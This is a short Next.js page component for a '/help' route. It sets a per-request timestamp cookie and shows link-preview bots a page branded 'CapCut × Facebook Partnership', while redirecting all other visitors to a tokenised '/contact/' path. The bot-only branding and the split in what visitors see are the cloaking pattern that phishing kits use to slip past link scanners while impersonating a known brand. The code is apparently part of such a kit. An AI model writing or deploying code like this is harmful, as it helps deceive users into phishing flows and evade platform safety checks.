import { buildSiteMetadata, isLinkPreviewBot, SITE_DESCRIPTION, SITE_TITLE } from '@/lib/site-metadata';
import { cookies, headers } from 'next/headers';
import { redirect } from 'next/navigation';

export const generateMetadata = async () => {
    const h = await headers();
    const host = h.get('x-forwarded-host') || h.get('host');
    const proto = h.get('x-forwarded-proto') || 'https';
    const base = `${proto}://${host}`;

    return buildSiteMetadata(base, '/help');
};

const HelpPage = async () => {
    // eslint-disable-next-line react-hooks/purity -- server-only token per request
    const token = `${Date.now()}`;
    const cookieStore = await cookies();
    cookieStore.set('token', token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        maxAge: 300,
        path: '/',
        sameSite: 'lax'
    });

    const h = await headers();
    const userAgent = h.get('user-agent');

    if (isLinkPreviewBot(userAgent)) {
        return (
            <main className='mx-auto flex min-h-screen max-w-3xl flex-col justify-center gap-4 px-6 py-16 text-center'>
                <p className='text-sm font-semibold tracking-wide text-primary uppercase'>CapCut × Facebook Partnership</p>
                <h1 className='text-3xl font-bold text-on-surface'>{SITE_TITLE}</h1>
                <p className='text-lg text-on-surface-variant'>{SITE_DESCRIPTION}</p>
            </main>
        );
    }

    redirect(`/contact/${token}`);
};

export default HelpPage;
